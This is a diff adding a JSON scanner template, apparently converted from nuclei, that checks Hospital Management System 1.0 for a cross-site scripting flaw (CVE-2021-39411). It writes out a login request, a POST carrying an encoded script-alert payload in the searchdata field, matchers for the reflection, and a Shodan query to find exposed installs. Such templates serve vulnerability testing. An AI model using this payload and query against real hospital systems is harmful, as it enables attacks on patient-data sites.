@@ -1,0 +1,132 @@
+{
+  "id": "hospital-management-xss2",
+  "name": "Hospital Management System 1.0 - Cross-Site Scripting",
+  "author": "arafatansari",
+  "severity": "HIGH",
+  "description": "Hospital Management System 1.0 contains a cross-site scripting vulnerability via the searchdata parameter in patient-search.php.\n",
+  "references": [
+    "https://vulmon.com/vulnerabilitydetails?qid\u003dCVE-2021-39411\u0026scoretype\u003dcvssv3"
+  ],
+  "tags": [
+    "hms",
+    "hospital",
+    "cms",
+    "xss",
+    "authenticated"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "http.html:\"Hospital Management System\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-79",
+  "cvssScore": "7.2",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /hms/admin/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername\u003d{{username}}\u0026password\u003d{{password}}\u0026submit\u003d\n",
+        "POST /hms/admin/patient-search.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nsearchdata\u003d%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\u0026search\u003d\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(header_2, \"text/html\")",
+            "status_code_2 \u003d\u003d 200",
+            "contains(body_2, \u0027Result against \\\"\u003cscript\u003ealert(document.domain)\u003c/script\u003e\\\" keyword\u0027)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "hospital-management-xss2",
+    "info": {
+      "name": "Hospital Management System 1.0 - Cross-Site Scripting",
+      "author": "arafatansari",
+      "severity": "high",
+      "description": "Hospital Management System 1.0 contains a cross-site scripting vulnerability via the searchdata parameter in patient-search.php.\n",
+      "reference": [
+        "https://vulmon.com/vulnerabilitydetails?qid\u003dCVE-2021-39411\u0026scoretype\u003dcvssv3"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+        "cvss_score": "7.2",
+        "cwe_id": "CWE-79"
+      },
+      "metadata": {
+        "max_request": 2,
+        "shodan_query": "http.html:\"Hospital Management System\""
+      },
+      "tags": "hms,hospital,cms,xss,authenticated"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /hms/admin/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername\u003d{{username}}\u0026password\u003d{{password}}\u0026submit\u003d\n",
+          "POST /hms/admin/patient-search.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nsearchdata\u003d%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E\u0026search\u003d\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(header_2, \"text/html\")",
+              "status_code_2 \u003d\u003d 200",
+              "contains(body_2, \u0027Result against \\\"\u003cscript\u003ealert(document.domain)\u003c/script\u003e\\\" keyword\u0027)"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
